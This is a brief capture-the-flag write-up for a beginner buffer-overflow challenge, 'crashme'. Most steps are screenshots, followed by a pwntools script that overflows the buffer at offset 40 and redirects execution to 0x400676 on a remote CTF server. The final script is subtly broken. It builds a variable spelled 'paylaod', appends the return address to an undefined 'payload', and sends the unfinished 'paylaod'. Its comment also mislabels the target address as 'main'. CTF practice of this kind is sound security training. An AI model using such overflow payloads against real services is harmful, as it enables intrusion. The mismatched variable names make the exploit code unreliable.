## Exploitation Challenges `Pwn`
### First Chall `Very Easy`
<img src="https://github.com/q5fj/Pwn/assets/88992167/1a26af55-38e2-4713-aca0-0cd186e952bb">

#### Check The Code `crashme.c`
<img src="https://github.com/q5fj/Pwn/assets/88992167/a6ba6a46-d7f9-4c70-9b83-f81922fc71b5">

#### Check The Program `file crashme`
<img src="https://github.com/q5fj/Pwn/assets/88992167/1f235cef-32cc-4ee3-b9ba-332e334f1fe6">

#### Check teh security of the Program `checksec crashme`
<img src="https://github.com/q5fj/Pwn/assets/88992167/83acfc89-a331-4fdb-960e-1f8598ae6eae">

#### Run The Program `./crashme`
<img src="https://github.com/q5fj/Pwn/assets/88992167/53813e8d-caaa-430d-8e22-7ab453aab13c">

#### Verify The Program Using `gdb ./crashme`
<img src="https://github.com/q5fj/Pwn/assets/88992167/b1114234-bbaa-4449-acaf-34ede9bb8180">

#### Using `disassemble main`
<img src="https://github.com/q5fj/Pwn/assets/88992167/aa7e2a29-c29e-4b3f-b22a-bf7c64a7202f">

#### Create Exploitation Program `PwnTools`
```
import shutup; shutup.please()
from pwn import *

elf = context.binary = ELF('./crashme')
io = elf.process()

context.log_level = 'debug'

io = remote('0.cloud.chals.io', 17289)

offset = ? 
```
#### We Need Offset `Using gdb`
```
gef➤  pattern create 100
gef➤  r
gef➤  pattern offset faaaaaaagaaaaaaahaaaaaa
```
<img src="https://github.com/q5fj/Pwn/assets/88992167/670dcd3d-2558-4d74-9b28-fdb2cc430669">
<img src="https://github.com/q5fj/Pwn/assets/88992167/34e6eede-609e-48f3-a13f-863309e2a634">

#### We Complete The Exploitation Program
```
import shutup; shutup.please()
from pwn import *

elf = context.binary = ELF('./crashme')
io = elf.process()

context.log_level = 'debug'

io = remote('0.cloud.chals.io', 17289)

offset = 40

paylaod = b''
paylaod += b'A' * offset
payload += p64(0x400676) #Address Function main

io.sendlineafter(b':',paylaod)
io.sendline(b'flag')
io.interactive()
```
<img src="https://github.com/q5fj/Pwn/assets/88992167/3abc20e4-1997-4a10-a2fb-03a87bcde462">








